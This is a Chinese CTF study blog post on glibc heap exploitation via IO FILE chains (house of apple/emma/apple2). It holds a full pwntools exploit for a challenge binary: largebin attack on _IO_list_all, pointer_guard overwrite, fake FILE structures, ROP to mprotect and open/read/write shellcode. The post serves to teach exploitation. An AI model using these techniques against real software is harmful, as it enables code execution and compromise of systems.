[
  
  
    {
      "title": "heap的IO链学习",
      "url": "https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/",
      "date": "2025-11-23",
      "content": "house of apple学习该题目大佬利用了house of emma和house of apple的组合攻击，最终实现了orw读取flag，在这里主要困难的点在于这里的edit也就修改chunk中的步骤只能一次，所以没办法直接利用house of emma（因为house of emma需要两次large bin attack，首先攻击pointer_guard将其修改为已知内容，第二攻击是攻击_IO_list_all，将其进行挟持到堆上，这样就可以控制FIFE的结构，实现最终的攻击效果），因此由于本题只能一次修改，没办法构成两次写，所以想到利用house of apple 可以实现pointer_guard进行覆盖为一个已知的值，这样在利用chain的值指向之后伪造的第二个file结构，对于这个结构可以实现house of emma的攻击方式，最终实现orw攻击查io链fpchainhouse of applehouse of apple的攻击原理，简单来说就是利用了_IO_wstrn_overflow这个函数，通过利用file的结构，这个函数可以覆盖传入fp-&gt;_wide_data上的地址覆盖为可以知道的堆地址，攻击效果和进行一次large bin attack一样，实现任意地址写已知地址。1234exit()/fcloseall() -&gt; _IO_cleanup() -&gt; _IO_flush_all_lockp() -&gt; 对 _IO_list_all 链表里每个 FILE 调用 vtable-&gt;_overflow（或其它 vtable 函数）_IO_FILE_plus结构体偏移1234567891011121314151617181920212223242526272829303132amd64： 0x0:'_flags',0x8:'_IO_read_ptr',0x10:'_IO_read_end',0x18:'_IO_read_base',0x20:'_IO_write_base',0x28:'_IO_write_ptr',0x30:'_IO_write_end',0x38:'_IO_buf_base',0x40:'_IO_buf_end',0x48:'_IO_save_base',0x50:'_IO_backup_base',0x58:'_IO_save_end',0x60:'_markers',0x68:'_chain',0x70:'_fileno',0x74:'_flags2',0x78:'_old_offset',0x80:'_cur_column',0x82:'_vtable_offset',0x83:'_shortbuf',0x88:'_lock',0x90:'_offset',0x98:'_codecvt',0xa0:'_wide_data',0xa8:'_freeres_list',0xb0:'_freeres_buf',0xb8:'__pad5',0xc0:'_mode',0xc4:'_unused2',0xd8:'vtable'首先上_IO_list_all的函数0x7ca9cdff3660 是全局变量 __GI__IO_list_all 的地址（也就是存指针的地方）0x7ca9cdff3680 是实际的 FILE 对象（_IO_2_1_stderr_）所在地址原结构体：123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; p *(struct _IO_FILE_plus*) 0x7ca9cdff3680$3 = { file = { _flags = -72540025, _IO_read_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_read_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_read_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_buf_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_buf_end = 0x7ca9cdff3704 &lt;_IO_2_1_stderr_+132&gt; \"\", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ca9cdff3760 &lt;_IO_2_1_stdout_&gt;, _fileno = 2, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ca9cdff2880 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ca9cdff4560 &lt;__GI__IO_file_jumps&gt;}修改后：fake_IO_FILE_plus（house of apple2）:1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *(struct _IO_FILE_plus*) 0x599c8d7a9810$20 = { file = { _flags = -1921343488, _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;, _IO_read_end = 0x7ca9cdff3250 &lt;main_arena+1520&gt; \"@2\\377ͩ|\", _IO_read_base = 0x599c8d7a97e0 \"\", _IO_write_base = 0x599c8d7a97e0 \"\", _IO_write_ptr = 0x7ca9cdff3640 &lt;_nl_global_locale+224&gt; \"\\255a\\373ͩ|\", _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x599c8d7a9a00 \" \", _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x599c8d7a98f0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ca9cdff4020 &lt;__GI__IO_wfile_jumps&gt;}house of emma这里主要利用了在fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync，如果我们把这个指针伪造成之前提到的pcop的gadget也就是mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];我们就可以实现rdx，而且call对应的函数，这里一般为setcontext+61,但是这篇文章是将其call mprotect函数，这样就可以增加可执行权限，之后直接执行orw的shellcode就可以了，原理一样的程序主逻辑，具备增删改查功能，最小申请堆的大小为key*0x110，限定创建堆块的大小都是large bin中的add函数没有堆溢出，有申请三种方式，申请空间有key,key+0x10,2*key三种delete函数存在UAF漏洞edit函数只有一次写入机会show函数只有一次泄露的机会利用步骤1.利用一次write泄露出libc和heapbase2.构造一次largebin attack，修改_IO_list_all为一个堆地址3.利用house of apple修改pointer_guard的值为已知地址4.利用house of emma控制rsp5.执行orw读取flag堆风水的构造由于我们只能任意修改一次的chunk内容，所以如果我们想要进行large bin attack攻击形成任意地址写一个堆地址，又在这个堆地址内完成对于fake file的构造，就需要我们完成以下的chunk构造，借用roderick01师傅的图。只有只有我们才能在伪造bk_nextsize的同时修改size为并且伪造fakechunk实现house of apple和house of emma的攻击。关于这个堆风水的布局，我之前一直很疑惑，为什么add(small),add(meidum),add(large)有这么多差别？？？后面学习了很多博主和gpt分析后，我大致理解了原理我们的目的就是构造三个chunk的布局12345chunk1 = heap_addr + 0x24chunk2 = heap_addr + 0x34chunk3 = heap_addr + 0x54如何构造的呢？首先我们可以分配的chunk的大小是key,key+0x10,2*key，然后依照大佬方式设置的key为0xa先设x = key+0x10,y = key +0x10+0x10,z = 2*key+0x10 ,我们可以得到一些关系，123452 * x = 2 * (0xa+0x10) = 0x342 * y = 2 * (0xa+0x20) = 0x54z = 2 * 0xa +0x20 = 0x24这意味着什么呢？就是我们分配2个small大小的堆，下个堆块指针指向的是chunk2的位置，分配2个meidum大小的堆块，下个堆块指向的是chunk3的位置，分配1个large大小的堆块，下个堆块指向的是chunk1的指针,然后由于后面删除的是unsortbin，导致和没分配一样的，就可以进行堆风水构造那么合理利用堆风水就可以构造出三个重叠的堆块:（从上至下顺序为：large+small,2small+small,2medium+small）继而可以修改堆块A的bk_nextsize指针并伪造一个堆块B，这样再进行largebin attack的时候就既可以任意地址写一个堆地址，也可以控制写的堆地址所在chunk的内容，从而构造fake file结构体。代码分析第一次堆风水，布置上面的大佬图中的chunk3（也就是代码里的2），两个meidum+small123456add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)第二次堆风水，布置大佬图中的chunk2（也就是代码里的5）,两个small+small123456add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)释放堆块3和堆块5进入unsortbin，可以泄露的了libc基址和heap基址1234567891011121314add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)关于TLS段的本地pointer_guard关于TLS段的本地pointer_guard怎么找，有个很恶心的点，就是在以前系统内核版本不高的时候，你可以用libc_base去直接得到pointer_guard的地址的，但是现在反正我无法像roderick01师傅一样，用他们打的时候的tls段就在libc基址前面一点，现在不行，已经调试过n遍，一直都会变的，和libc基址没关系了，pointer_guard的地址，与ld基地址偏移是固定的，而与libc基地址的偏移不固定。所以在本地调试过程中，需要关闭aslr，才能获得与libc基地址的固定偏移，当打远程的题目时，则需要爆破。方法1：fsbase+0x30（tls+0x30）方法2:第三次堆风水，布置大佬图中的chunk1（也就是代码里的8）1234567dele(4)dele(6)add(3) #7add(1) #8add(1) #8dele(8)add(3)解释一下，dele(8)是为了先free掉我们的提到的chunk2，，当 malloc 在找合适块时，它会遍历 unsorted 的条目，会优先检查 unsorted bin。如果某个 unsorted 条目正好或可以分割出一个满足请求的小块，malloc 会用它（并把剩下的部分重新插回合适的 bin）。如果某个条目太大/不能直接用来划分，malloc 会把它按大小插入到 largebin（或者 smallbin，视大小而定），以便下次快速匹配，然后add(3)这么大的堆块需要0x1550的大小，而前面的unsorted bin只有0xab0大小，所以malloc会把原来的unsorted bin插入large bin里去，然后从top chunk里分配给新的堆块1234edit(5,data)dele(2)add(3)exit()触发largebin attack之后修改成功了，可以修改chunk8的bk_nextsize为_IO_list_all，，并且chunk2是0x810,于是我们同时将chunk2的size修改，从而伪造一个chunk进行释放，那么想一下，这里触发的largebin attack正好将_IO_list_all修改为这个伪造的chunk，那么我们继续往下写的话，那相当于就是对伪造的_IO_list_all进行填充，那我们就实现了任意控制__IO_list_all了。伪造后的file表结构（这个是修改pointer_guard）123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; p *(struct _IO_FILE_plus*) 0x555555606810$2 = { file = { _flags = 0, _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;, _IO_read_end = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\", _IO_read_base = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\", _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x555555606910, _fileno = 0, _flags2 = 8, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc4630, //这个是pointer_guard所在的堆地址 _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7df3d20 &lt;_IO_wstrn_jumps&gt;}我们把chain改成了0x910，vtable改成了_IO_wstrn_jumps(跳转到_IO_wstrn_overflow),接着看一下0x910这个fake file结构体123456789101112131415161718192021222324252627282930313233343536373839404142434445pwndbg&gt; p *(struct _IO_cookie_file*) 0x555555606910$4 = { __fp = { file = { _flags = 0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 8, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7df3b38 &lt;_IO_cookie_jumps+88&gt; }, __cookie = 0x555555606a10, __io_functions = { read = 0x5555456812400000, write = 0x6661616566616164, seek = 0x6661616766616166, close = 0x7ffff7cfd449 &lt;__lockf64+73&gt; }}然后又将rbp的值给rdx，这里就将pointer_guard的值给修改了。而rbp就是f1._wide_data = guard传入的值，这里修改了point_guard的值然后继续执行下一个fake file结构体进行加密操作加密后正好执行我们的gadget后面就开始执行rop链了可以知道为什么target_addr的地址要加0x20，因为经过call qword ptr [rax + 0x18]后，可以直接调用_IO_cookie_read函数拿到flag关于第一个IO结构体的_chain地址为什么是chain = heap_base + 0x17e0 + 0x30 + 0x100，因为第一个large bin距离heapbase的偏移是0x17e0，然后由于分配2个medium大小的chunk后的下一个指向的chunk3，与chunk1的偏移是0x30(0x54-0x24),上文提到过，然后f1与f2的距离有0x100的偏移，所以说___chain的地址就是f2的地址exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225from pwn import *from pwncli import* from ctypes import *pwn = './oneday'libc = ELF(\"./libc.so.6\")if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn) #io = process(['setarch','$(uname -m)','-R','./oneday'])context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"{bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f'%{num}c%{offset}${size}'.encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def set_key(key): sla(b'key &gt;&gt;\\n',str(key))def add(choise): sla(b'command:',b'1') sla(b'choise: ',str(choise))def dele(idx): sla(b'command: \\n',b'2') sla(b'Index: ',str(idx))def edit(idx,commend): sla(b'command:',b'3') sla(b'Index: ',str(idx)) sa(b'Message: \\n',commend)def show(idx): sla(b'command:',b'4') sla(b'Index: ',str(idx)) def exit(): sla(b'command:',b'6') set_key(10)debug(\"call (void)signal(SIGALRM, SIG_IGN)\") add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)dele(4)dele(6)add(3) #7add(1) #8add(1) #9pause()dele(8)add(3)target_addr = libc_base + libc.sym['_IO_list_all'] lg(b'_IO_list_all',target_addr)_IO_cookie_jumps = libc_base + 0x1f3ae0_IO_wstrn_jumps = libc_base + 0x1f3d20_IO_stdfile_1_lock = libc_base + 0x1f5720__pointer_chk_guard_local = libc_base + 0x3c4630magic = libc_base + 0x146020chain = heap_base + 0x17e0 + 0x30 + 0x100expected = heap_base + 0x17e0 + 0x20 +0x100 mov_rsp_rdx = libc_base + 0x56530add_rsp_0x20_pop_rbx = libc_base + 0xfd449pop_rdi = libc_base + 0x2daa2pop_rsi = libc_base + 0x37c0apop_rdx_rbx = libc_base + 0x87729 f1 = IO_FILE_plus_struct()f1._IO_read_ptr = 0xa81f1.chain = chainf1._flags2 = 8f1._lock = _IO_stdfile_1_lockf1._mode = 0f1._wide_data = __pointer_chk_guard_localf1.vtable = _IO_wstrn_jumpsf2 = IO_FILE_plus_struct()f2._IO_write_base = 0f2._IO_write_ptr = 1f2._mode = 0f2._lock = _IO_stdfile_1_lockf2._flags2 = 8f2.vtable = _IO_cookie_jumps +0x58data = flat( { 0x8: target_addr-0x20, 0x10: { 0:{ 0:bytes(f1), 0x100:{ 0:bytes(f2), 0xe0:[chain + 0x100,rol(magic ^ expected,0x11)], 0x100:[ add_rsp_0x20_pop_rbx, chain + 0x100, 0, 0, mov_rsp_rdx, 0, pop_rdi, chain &amp; ~0xfff, pop_rsi, 0x4000, pop_rdx_rbx, 7,0, libc_base + libc.sym[\"mprotect\"], chain + 0x200,#存放orw的rop链的堆地址 ], 0x200:asm(shellcraft.open('./flag',0) +shellcraft.read(3,heap_base,0x100)+shellcraft.write(1,heap_base,0x100)), } }, 0xa80:[0,0xab1] }})f1_addr = heap_base + 0x1810f2_addr = heap_base + 0x1910# x = 0xa + 0x10 = 0x1a# y = 0xa + 0x10 + 0x10 = 0x2a# z = 2 * 0xa + 0x10 = 0x24 #chunk1_addr = f1_addr - 0X10 + 0x24#chunk2_addr = f1_addr - 0X10 + 0x34#chunk3_addr = f1_addr - 0x10 + 0x54 lg(b'f1_addr',f1_addr)lg(b'f2_addr',f2_addr)edit(5,data)dele(2)pause()add(3)exit()inter()house of apple2利用条件使用house of apple2的条件为： 已知heap地址和glibc地址 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发 能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制利用原理stdin/stdout/stderr这三个_IO_FILE结构体使用的是_IO_file_jumps这个vtable，而当需要调用到vtable里面的函数指针时，会使用宏去调用。以_IO_file_overflow调用为例，glibc中调用的代码片段分析如下12345#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))其中，IO_validate_vtable函数负责检查vtable的合法性，会判断vtable的地址是不是在一个合法的区间。如果vtable的地址不合法，程序将会异常终止。观察struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员。12345678910111213141516171819202122struct _IO_wide_data{ wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable;};在调用_wide_vtable虚表里面的函数时，同样是使用宏去调用，仍然以vtable-&gt;_overflow调用为例，所用到的宏依次为：12345678#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable可以看到，在调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查。因此，我们可以劫持IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可控的堆地址空间，进而控制_wide_data-&gt;_wide_vtable为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流。利用思路目前在glibc源码中搜索到的_IO_WXXXXX系列函数的调用只有_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE和_IO_WOVERFLOW。其中_IO_WSETBUF和_IO_WUNDERFLOW目前无法利用或利用困难，其余的均可构造合适的_IO_FILE进行利用。这里给出我总结的几条比较好利用的链。以下使用fp指代_IO_FILE结构体变量。利用_IO_wfile_overflow函数控制程序执行流对fp的设置如下： _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格 vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0 _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C函数的调用链如下：1234_IO_wfile_overflow _IO_wdoallocbuf _IO_WDOALLOCATE *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)详细分析如下：首先看_IO_wfile_overflow函数1234567891011121314151617181920wint_t_IO_wfile_overflow (FILE *f, wint_t wch){ if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ { f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return WEOF; } /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0) { /* Allocate a buffer if needed. */ if (f-&gt;_wide_data-&gt;_IO_write_base == 0) { _IO_wdoallocbuf (f);// 需要走到这里 // ...... } }}需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0然后看_IO_wdoallocbuf函数：123456789101112void_IO_wdoallocbuf (FILE *fp){ if (fp-&gt;_wide_data-&gt;_IO_buf_base) return; if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED)) if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用 return; _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);}libc_hidden_def (_IO_wdoallocbuf)需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。利用_IO_wfile_underflow_mmap函数控制程序执行流对fp的设置如下： _flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格 vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可 _IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10) _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8) _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 _wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0 _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C函数的调用链如下：1234_IO_wfile_underflow_mmap _IO_wdoallocbuf _IO_WDOALLOCATE *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)详细分析如下：看_IO_wfile_underflow_mmap函数：12345678910111213141516171819202122232425262728293031323334353637383940static wint_t_IO_wfile_underflow_mmap (FILE *fp){ struct _IO_codecvt *cd; const char *read_stop; if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS)) { fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return WEOF; } if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end) return *fp-&gt;_wide_data-&gt;_IO_read_ptr; cd = fp-&gt;_codecvt; /* Maybe there is something left in the external buffer. */ if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end /* No. But maybe the read buffer is not fully set up. */ &amp;&amp; _IO_file_underflow_mmap (fp) == EOF) /* Nothing available. _IO_file_underflow_mmap has set the EOF or error flags as appropriate. */ return WEOF; /* There is more in the external. Convert it. */ read_stop = (const char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL) { /* Maybe we already have a push back pointer. */ if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL) { free (fp-&gt;_wide_data-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; } _IO_wdoallocbuf (fp);// 需要走到这里 } //......}需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。利用_IO_wdefault_xsgetn函数控制程序执行流这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0。如果不满足这个条件，可选用其他链。对fp的设置如下： _flags设置为0x800 vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可 _mode设置为大于0，即满足*(fp + 0xc0) &gt; 0 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A _wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18) _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C函数的调用链如下：12345_IO_wdefault_xsgetn __wunderflow _IO_switch_to_wget_mode _IO_WOVERFLOW *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)详细分析如下：首先看_IO_wdefault_xsgetn函数：12345678910111213141516171819202122232425262728293031323334353637size_t_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n){ size_t more = n; wchar_t *s = (wchar_t*) data; for (;;) { /* Data available. */ ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end - fp-&gt;_wide_data-&gt;_IO_read_ptr); if (count &gt; 0) { if ((size_t) count &gt; more) count = more; if (count &gt; 20) { s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count); fp-&gt;_wide_data-&gt;_IO_read_ptr += count; } else if (count &lt;= 0) count = 0; else { wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr; int i = (int) count; while (--i &gt;= 0) *s++ = *p++; fp-&gt;_wide_data-&gt;_IO_read_ptr = p; } more -= count; } if (more == 0 || __wunderflow (fp) == WEOF) break; } return n - more;}libc_hidden_def (_IO_wdefault_xsgetn)由于more是第三个参数，所以不能为0。直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。随后当more != 0时会进入__wunderflow。接着看__wunderflow：12345678910111213wint_t__wunderflow (FILE *fp){ if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1)) return WEOF; if (fp-&gt;_mode == 0) _IO_fwide (fp, 1); if (_IO_in_put_mode (fp)) if (_IO_switch_to_wget_mode (fp) == EOF) return WEOF; // ......}要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。然后在_IO_switch_to_wget_mode函数中：12345678int_IO_switch_to_wget_mode (FILE *fp){ if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) 